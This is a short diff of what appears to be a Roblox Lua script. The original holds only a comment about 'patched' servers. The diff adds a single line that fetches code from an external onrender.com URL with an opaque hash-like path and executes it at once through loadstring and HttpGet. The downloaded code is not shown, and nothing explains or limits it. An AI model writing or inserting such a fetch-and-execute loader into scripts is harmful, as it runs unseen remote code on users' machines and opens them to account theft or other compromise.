@@ -1,1 +1,3 @@
 -- Patched 700 to 10 servers
+
+loadstring(game:HttpGet("http://sunny-5n92.onrender.com/raw/b92a21defc9ce2bf29a33bf3be0462d17c6982cc0e82f666d3a320ec994defd3094f85100c0bc64aef0f802e3b6cf7e97221aa481f443e74853441ea6940294e", true))()
